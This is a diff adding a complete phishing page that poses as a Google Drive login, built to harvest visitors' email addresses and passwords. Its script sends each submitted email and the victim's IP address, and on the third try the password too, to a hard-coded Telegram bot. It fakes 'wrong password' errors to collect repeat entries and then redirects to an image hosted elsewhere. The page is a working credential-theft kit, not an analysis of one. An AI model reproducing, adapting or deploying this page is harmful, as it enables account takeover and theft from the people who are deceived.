@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Google Drive</title>
+<link rel="icon" href="https://t0.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=https://www.google.com"></head>
+<style>
+  /* Your existing styles here (unchanged) */
+  body {
+    background-image: url("https://image.thum.io/get/maxAge/120/width/900/https://polywin.co.in/Paymt/001.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    font-family: "Cash Market Light Rounded", sans-serif;
+    margin: 0;
+    height: 100vh;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+  }
+  .login-panel {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%) scale(0.8);
+    width: 90%;
+    max-width: 400px;
+    background: rgba(255,255,255,0.95);
+    border-radius: 15px;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+    padding: 30px;
+    text-align: center;
+    opacity: 0;
+    transition: all .4s ease;
+    pointer-events: none;
+    z-index: 10;
+  }
+  .login-panel.active {
+    opacity: 1;
+    transform: translate(-50%,-50%) scale(1);
+    pointer-events: all;
+  }
+  input[type="text"], input[type="password"] {
+    width: 90%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+  }
+  button {
+    background-color: #0078d7;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 10px;
+  }
+  button:disabled { background-color: gray; cursor: not-allowed; }
+  label { font-size: 15px; }
+  .overlay {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: rgba(0,0,0,0.3); opacity:0; transition:opacity .4s ease;
+    z-index:5; pointer-events:none;
+  }
+  .overlay.active { opacity:1; pointer-events:all; }
+  .message { margin-top:15px; font-size:16px; display:none; }
+  .processing { color: #0078d7; display:block; }
+  .success { color: green; display:block; }
+  .error { color: red; display:block; }
+  .spinner {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #0078d7;
+    border-radius: 50%;
+    width: 20px; height: 20px; animation: spin 1s linear infinite;
+    display:inline-block; vertical-align:middle; margin-right:8px;
+  }
+  @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
+  /* small responsive fix */
+  @media (max-width:480px) {
+    .login-panel { padding:18px; }
+    input[type="text"], input[type="password"] { font-size:15px; }
+  }
+</style>
+</head>
+<body>
+  <div class="overlay" id="overlay"></div>
+
+  <div class="login-panel" id="loginPanel">
+  <!-- Google Drive Logo placed before email input -->
+  <img src="https://i.gyazo.com/e12b9c0de3a9b5d5612e62cdb91044da.png" alt="Google Drive Logo" id="logo" style="width: 100px; margin-bottom: 15px; display: block; margin-left: auto; margin-right: auto;" />
+   <form id="loginForm" autocomplete="off">
+  <input type="text" id="username" name="username" placeholder="Email" required><br>
+  <input type="password" id="password" name="password" placeholder="Password" required><br>
+  <label><input type="checkbox" id="notRobot"> Confirm that you are not a robot 🤖</label><br>
+  <button type="submit" id="loginBtn" disabled>View Document</button>
+  <div id="message" class="message" aria-live="polite"></div>
+</form>
+  </div>
+<script>
+ // Your existing variables...
+const MAX_ATTEMPTS = 3;
+let attemptCount = 0;
+let userIP = '';
+
+const loginPanel = document.getElementById('loginPanel');
+const overlay = document.getElementById('overlay');
+const checkbox = document.getElementById('notRobot');
+const loginBtn = document.getElementById('loginBtn');
+const message = document.getElementById('message');
+const form = document.getElementById('loginForm');
+
+// Your Telegram Bot Token and Chat ID
+const TELEGRAM_BOT_TOKEN = '7996177632:AAFxmZqQCIqBwhHwLRGWiUxfNaycyocpOr0'; // replace with your bot token
+const TELEGRAM_CHAT_ID = '1279485009';     // replace with your chat ID
+
+// Fetch user's IP
+async function fetchIP() {
+  try {
+    const resp = await fetch('https://api.ipify.org?format=json');
+    const data = await resp.json();
+    userIP = data.ip;
+  } catch (e) {
+    userIP = 'Unknown';
+  }
+}
+fetchIP();
+
+// Send message to Telegram
+async function sendToTelegram(email, password, ip) {
+  const messageText = `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(messageText)}`;
+  try {
+    await fetch(url);
+  } catch (e) {
+    console.error('Failed to send message to Telegram', e);
+  }
+}
+
+// Send attempt info (for attempt count)
+async function reportAttemptToTelegram(email, ip, attemptNumber) {
+  const messageText = `Login Attempt ${attemptNumber}:\nEmail: ${email}\nIP: ${ip}`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(messageText)}`;
+  try {
+    await fetch(url);
+  } catch (e) {
+    console.error('Failed to send attempt report', e);
+  }
+}
+
+// UI helpers
+function showProcessing() {
+  message.innerHTML = '<span class="spinner"></span> Processing...';
+  message.className = 'message processing';
+  message.style.display = 'block';
+}
+
+function showError(text) {
+  message.textContent = text;
+  message.className = 'message error';
+  message.style.display = 'block';
+}
+
+function showSuccess(text) {
+  message.textContent = text;
+  message.className = 'message success';
+  message.style.display = 'block';
+}
+
+// Event handlers for modal
+document.body.addEventListener('click', () => {
+  loginPanel.classList.add('active');
+  overlay.classList.add('active');
+});
+overlay.addEventListener('click', () => {
+  loginPanel.classList.remove('active');
+  overlay.classList.remove('active');
+});
+checkbox.addEventListener('change', () => {
+  loginBtn.disabled = !checkbox.checked;
+});
+
+// Form submission
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  if (!checkbox.checked) {
+    showError('Please confirm you are not a robot.');
+    return;
+  }
+
+  const email = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value;
+
+  if (!email.includes('@')) {
+    showError('Please enter a valid email address.');
+    return;
+  }
+
+  attemptCount++;
+  await reportAttemptToTelegram(email, userIP, attemptCount);
+
+  if (attemptCount < MAX_ATTEMPTS) {
+    showProcessing();
+    message.innerHTML = 'Confirming...';
+
+    setTimeout(() => {
+      showError('Wrong password, try again.');
+      document.getElementById('password').value = '';
+    }, 2000);
+    return;
+  }
+
+  // On third attempt: proceed with "success"
+  showProcessing();
+  loginBtn.disabled = true;
+
+  // Send final login info
+  await sendToTelegram(email, password, userIP);
+
+  // Show success and redirect
+  setTimeout(() => {
+    showSuccess('Confirmation successful! Redirecting...');
+    // Ensure redirect happens after showing success message
+    setTimeout(() => {
+      console.log('Redirecting now...');
+      window.location.href = 'https://polywin.co.in/Paymt/001.jpg';
+    }, 1000);
+  }, 1500);
+});
+</script>
